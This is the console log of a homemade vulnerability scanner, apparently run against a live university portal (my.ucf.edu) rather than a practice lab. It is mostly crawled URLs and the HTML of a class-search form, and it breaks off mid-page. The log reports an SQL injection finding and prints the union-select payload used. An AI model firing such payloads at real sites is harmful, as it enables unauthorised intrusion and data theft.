@@ -1,0 +1,2764 @@
+python VulnScanner.py
+
+
+1. My UCF
+2. Vulnweb
+3. DVWA
+4. Custom URL
+Enter your choice--> 1
+
+Is your account secured with MultiFactor Authentication (DUO Authentication)? (Y/N)-->
+n
+
+
+Enter the login link of the target URL
+Eg - http://testphp.vulnweb.com/login.php
+https://idp-prod.cc.ucf.edu/idp/profile/SAML2/Redirect/SSO?execution=e1s1
+
+
+Enter the username for login page
+Eg - admin
+--------
+
+
+Enter the password for login page
+Eg - password
+---------
+
+https://my.ucf.edu/static_support/css/style.min.css
+https://my.ucf.edu/nid.html
+https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+https://my.ucf.edu/cs/IHPROD/cache4/PSSTYLEREQ_1.css
+https://my.ucf.edu/cs/IHPROD/cache4/PSSTYLEDEF_TANGERINE_1.css
+https://my.ucf.edu/cs/IHPROD/cache4/PT_PRCS_USER_NOTIFY_CSS_1.css
+https://my.ucf.edu/cs/IHPROD/cache4/FX_PSSTYLEDEF_2018_1.css
+https://my.ucf.edu/cs/IHPROD/cache4/FX_DEFAULT_THEME_FLUID_1.css
+https://my.ucf.edu/cs/IHPROD/cache4/FX_FLUID_OVERRIDE_1.css
+https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+
+
+--> Testing https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.SSS_BROWSE_CATLG.GBL?pslnkid=UCF_S201303041350319311197241
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/
+--> Testing form in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501
+
+
+***** SQL Injection vulnerability discovered in https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL?pslnkid=UCF_S201303041350157557298501 in the following form *****
+
+ Script used --> %' or 0=0 union select null, version() #
+<form action="https://my.ucf.edu/psp/IHPROD/GUEST/CSPROD/c/COMMUNITY_ACCESS.CLASS_SEARCH.GBL" autocomplete="off" class="PSForm" id="CLASS_SEARCH" method="post" name="win0">
+<div class="ps_box-toolshiddens" id="win0divPSTOOLSHIDDENS">
+<div class="ps_modalmask_cover psc_hidden" id="pt_modalMaskCover"> </div>
+<div class="ps_modalmask psc_hidden" id="pt_modalMask"> </div>
+<div class="PSMODAL" id="pt_modals">
+<div class="popupDragFrame" id="ptModalShadow" style="cursor:nw-resize"> </div>
+</div>
+<div class="ps_typeahead psc_hidden" id="pt_typeahead0"><span class="spanTextDropdown" id="pt_typeahead"> </span></div>
+<div id="WAIT_win0" style="display:none;position:absolute;right:0;"><img align="left" alt="Processing... please wait" id="processing" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_PROCESSING_1.gif" title="Processing... please wait"/></div>
+<div aria-atomic="true" aria-live="assertive" aria-relevant="text additions" class="psc_processing psc_hidden" id="Delayed_win0" style="visibility:hidden; display:none; position:absolute;left:-10000px;top:auto; width:1px; height:1px;overflow:hidden;"> </div>
+<div id="SAVED_win0" style="display:none;position:absolute;right:0;">
+<table border="0" cellpadding="0" cellspacing="0">
+<tr>
+<td><img alt="" border="0" height="39" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_LEFT_1.gif" width="7"/></td>
+<td align="center" background="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_CENTER_1.gif" id="saveWait_win0" valign="middle" width="35"><img alt="" height="24" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_LOADER_1.gif" width="24"/></td>
+<td background="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_CENTER_1.gif" nowrap="nowrap"><span class="PSPROCESSING" dir="ltr" id="ptStatusText_win0"> </span></td>
+<td><img alt="" height="39" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PTPORTAL_POPBOX_RIGHT_1.gif" width="6"/></td>
+<td> </td>
+</tr>
+</table>
+</div>
+<div class="x" id="win0divPSHIDDENFIELDS" style="display:none"><input id="ICType" name="ICType" type="hidden" value="Panel"/><input id="ICElementNum" name="ICElementNum" type="hidden" value="0"/><input id="ICStateNum" name="ICStateNum" type="hidden" value="9"/><input id="ICAction" name="ICAction" type="hidden" value="None"/><input id="ICModelCancel" name="ICModelCancel" type="hidden" value="0"/><input id="ICXPos" name="ICXPos" type="hidden" value="0"/><input id="ICYPos" name="ICYPos" type="hidden" value="0"/><input id="ResponsetoDiffFrame" name="ResponsetoDiffFrame" type="hidden" value="-1"/><input id="TargetFrameName" name="TargetFrameName" type="hidden" value="None"/><input id="FacetPath" name="FacetPath" type="hidden" value="None"/><input id="ICFocus" name="ICFocus" type="hidden" value=""/><input id="ICSaveWarningFilter" name="ICSaveWarningFilter" type="hidden" value="0"/><input id="ICChanged" name="ICChanged" type="hidden" value="-1"/><input id="ICSkipPending" name="ICSkipPending" type="hidden" value="0"/><input id="ICAutoSave" name="ICAutoSave" type="hidden" value="0"/><input id="ICResubmit" name="ICResubmit" type="hidden" value="0"/><input id="ICSID" name="ICSID" type="hidden" value="xzKAljBrDFdwgnNk2VF4+CvxMXq8IgdoMcSNIPHPO/k="/><input id="ICActionPrompt" name="ICActionPrompt" type="hidden" value="false"/><input id="ICBcDomData" name="ICBcDomData" type="hidden" value=""/><input id="ICPanelName" name="ICPanelName" type="hidden" value=""/><input id="ICFind" name="ICFind" type="hidden" value=""/><input id="ICAddCount" name="ICAddCount" type="hidden" value=""/><input id="ICAppClsData" name="ICAppClsData" type="hidden" value=""/></div>
+</div>
+<a id="ICFirstAnchor_win0" name="ICFirstAnchor_win0"></a>
+<div class="ps_pagecontainer" id="win0divPAGECONTAINER">
+<table aria-labelledby="app_label" class="PSPAGECONTAINER" role="main">
+<tr>
+<td>
+<div class="ps_pspagecontainer" id="win0divPSPAGECONTAINER">
+<table border="0" cellpadding="0" cellspacing="0" class="PSPAGECONTAINER" cols="7" id="ACE_width" role="presentation" width="1109">
+<tr>
+<td height="0" width="0"></td>
+<td width="36"></td>
+<td width="508"></td>
+<td width="112"></td>
+<td width="12"></td>
+<td width="434"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td colspan="4" height="12"></td>
+<td align="left" rowspan="3" valign="top">
+<div id="win0div$ICField255">
+<div style="width:12px; "><!-- Begin HTML Area Name Undisclosed -->
+<script src="https://www.google.com/recaptcha/api.js" type="text/javascript">
+</script>
+<!-- End HTML Area --></div>
+</div>
+</td>
+</tr>
+<tr>
+<td height="52"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUPBOX2">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="543">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Groupbox</td>
+</tr>
+<tr>
+<td width="541">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_GROUPBOX2" role="presentation" style="border-style:none" width="541">
+<tr>
+<td height="0" width="3"></td>
+<td width="6"></td>
+<td width="295"></td>
+<td width="237"></td>
+</tr>
+<tr>
+<td colspan="2" height="14"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SS_TRANSACT_TITLE"><span aria-level="1" class="PATRANSACTIONTITLE" id="DERIVED_CLSRCH_SS_TRANSACT_TITLE" role="heading">Search for Classes</span></div>
+</td>
+</tr>
+<tr>
+<td height="9"></td>
+<td align="left" colspan="2" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_CLASS_LBLlbl"><span class="PAPAGETITLE">Enter Search Criteria</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_CLASS_LBL"><span class="PSEDITBOX_DISPONLY" id="DERIVED_CLSRCH_SSR_CLASS_LBL"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="0"></td>
+</tr>
+<tr>
+<td height="762"></td>
+<td align="left" colspan="5" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP2">
+<table cellpadding="2" cellspacing="0" class="PSGROUPBOXWBO" cols="1" width="1101">
+<tr>
+<td align="left" class="PSGROUPBOXLABEL">Search for Classes</td>
+</tr>
+<tr>
+<td width="1097">
+<table border="0" cellpadding="0" cellspacing="0" class="PSGROUPBOX" cols="5" id="ACE_DERIVED_CLSRCH_GROUP2" role="presentation" style="border-style:none" width="1097">
+<tr>
+<td height="0" width="2"></td>
+<td width="716"></td>
+<td width="182"></td>
+<td width="193"></td>
+<td width="4"></td>
+</tr>
+<tr>
+<td height="87"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP3">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="897">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Class Search Criteria</td>
+</tr>
+<tr>
+<td width="895">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_GROUP3" role="presentation" style="border-style:none" width="895">
+<tr>
+<td height="0" width="3"></td>
+<td width="588"></td>
+<td width="72"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="24"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0div$ICField171">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="659">
+<tr>
+<td width="657">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_$ICField171" role="presentation" style="border-style:none" width="657">
+<tr>
+<td height="0" width="0"></td>
+<td width="227"></td>
+<td width="3"></td>
+<td width="427"></td>
+</tr>
+<tr>
+<td colspan="3" height="4"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_INSTITUTION$31$"><select class="PSDROPDOWNLIST" id="CLASS_SRCH_WRK2_INSTITUTION$31$" name="CLASS_SRCH_WRK2_INSTITUTION$31$" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:220px; " tabindex="21">
+<option value=""> </option>
+<option selected="selected" value="UCF01">University of Central Florida</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="14"></td>
+<td align="right" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_INSTITUTION$31$lbl"><label class="PSDROPDOWNLABEL" for="CLASS_SRCH_WRK2_INSTITUTION$31$" id="CLASS_SRCH_WRK2_INSTITUTION$31$_LBL">Institution</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="26"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP1">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="587">
+<tr>
+<td width="585">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_GROUP1" role="presentation" style="border-style:none" width="585">
+<tr>
+<td height="0" width="0"></td>
+<td width="227"></td>
+<td width="3"></td>
+<td width="355"></td>
+</tr>
+<tr>
+<td colspan="3" height="4"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_STRM$35$"><select class="PSDROPDOWNLIST" id="CLASS_SRCH_WRK2_STRM$35$" name="CLASS_SRCH_WRK2_STRM$35$" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:220px; " tabindex="22">
+<option value=""></option>
+<option value=""> </option>
+<option value="1740">1740 - Spring 2022</option>
+<option value="1750">1750 - Summer 2022</option>
+<option selected="selected" value="1760">1760 - Fall 2022</option>
+<option value="1770">1770 - Spring 2023</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="12"></td>
+<td align="right" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_STRM$35$lbl"><label class="PSDROPDOWNLABEL" for="CLASS_SRCH_WRK2_STRM$35$" id="CLASS_SRCH_WRK2_STRM$35$_LBL">Term</label></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="0"></td>
+</tr>
+<tr>
+<td height="29"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0div$ICField252">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="659">
+<tr>
+<td width="657">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_$ICField252" role="presentation" style="border-style:none" width="657">
+<tr>
+<td height="0" width="7"></td>
+<td width="436"></td>
+<td width="214"></td>
+</tr>
+<tr>
+<td height="23"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField143"><span class="PAPAGEINSTRUCTIONS">Select at least 2 search criteria. Select Search to view your search results.</span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td colspan="4" height="3"></td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="633"></td>
+<td align="left" colspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_GROUP4">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1090">
+<tr>
+<td width="1088">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_GROUP4" role="presentation" style="border-style:none" width="1088">
+<tr>
+<td height="0" width="3"></td>
+<td width="1080"></td>
+<td width="5"></td>
+</tr>
+<tr>
+<td height="619"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField193$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField193$scroll$0" onclick="getScrollTableId('$ICField193$scroll$0')" width="1079">
+<tr>
+<td width="1077">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_$ICField193$0" role="presentation" style="border-style:none" width="1077">
+<tr>
+<td height="0" width="0"></td>
+<td width="504"></td>
+<td width="569"></td>
+<td width="5"></td>
+</tr>
+<tr>
+<td height="21"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="503">
+<tr>
+<td align="left" class="PAGROUPBOXLABELINVISIBLE">Class Search</td>
+</tr>
+<tr>
+<td width="501">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="4" id="ACE_DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$0" role="presentation" style="border-style:none" width="501">
+<tr>
+<td height="0" width="3"></td>
+<td width="16"></td>
+<td width="250"></td>
+<td width="232"></td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0"><a href="javascript:submitAction_win0(document.win0,'DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0');" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0" name="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$0" onclick="javascript:cancelBubble(event);" role="button" tabindex="40"><img alt="Class Search" border="0" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$149$$IMG$0" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PS_COLLAPSE_ICN_1.gif" title="Class Search"/></a></div>
+</td>
+</tr>
+<tr>
+<td height="2"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$lbl$0"><span class="PSEDITBOXLABEL">Class Search</span></div>
+</td>
+</tr>
+<tr>
+<td height="13"></td>
+<td align="left" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$0"><span class="PTTRANSPARENT" id="DERIVED_CLSRCH_SSR_EXPAND_COLLAPS$255$$0"> </span></div>
+</td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</div>
+</td>
+</tr>
+<tr>
+<td height="160"></td>
+<td align="left" colspan="2" valign="top">
+<div id="win0divDERIVED_CLSRCH_SSR_GROUP_BOX_1$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" width="1072">
+<tr>
+<td width="1070">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="3" id="ACE_DERIVED_CLSRCH_SSR_GROUP_BOX_1$0" role="presentation" style="border-style:none" width="1070">
+<tr>
+<td height="0" width="3"></td>
+<td width="1060"></td>
+<td width="7"></td>
+</tr>
+<tr>
+<td height="156"></td>
+<td align="left" valign="top">
+<div id="win0div$ICField232$0">
+<table cellpadding="2" cellspacing="0" class="PABACKGROUNDINVISIBLEWBO" cols="1" id="$ICField232$scrolli$0" onclick="getScrollTableId('$ICField232$scrolli$0')" width="1059">
+<tr>
+<td width="1057">
+<table border="0" cellpadding="0" cellspacing="0" class="PABACKGROUNDINVISIBLE" cols="14" id="ACE_$ICField232$0" role="presentation" style="border-style:none" width="1057">
+<tr>
+<td height="8" width="0"></td>
+<td width="220"></td>
+<td width="3"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="1"></td>
+<td width="2"></td>
+<td width="178"></td>
+<td width="48"></td>
+<td width="4"></td>
+<td width="9"></td>
+<td width="3"></td>
+<td width="96"></td>
+<td width="490"></td>
+</tr>
+<tr>
+<td colspan="5" height="1"></td>
+<td align="left" colspan="3" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divCLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0"><a class="PSPUSHBUTTON Left" role="presentation"><span style="background-Color: transparent;"><input class="PSPUSHBUTTON" id="CLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0" name="CLASS_SRCH_WRK2_SSR_PB_SUBJ_SRCH$0" onclick="submitAction_win0(document.win0,this.id,event);" style="width:143px; " tabindex="56" title="Search for a Subject" type="button" value="select subject"/></span></a></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="1"></td>
+<td colspan="4" rowspan="2"></td>
+<td align="left" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUBJECT$0"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SUBJECT$0" maxlength="8" name="SSR_CLSRCH_WRK_SUBJECT$0" onchange="addchg_win0(this);oChange_win0=this;" style="width:80px; " tabindex="57" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td colspan="5" height="2"></td>
+<td align="left" rowspan="2" valign="top">
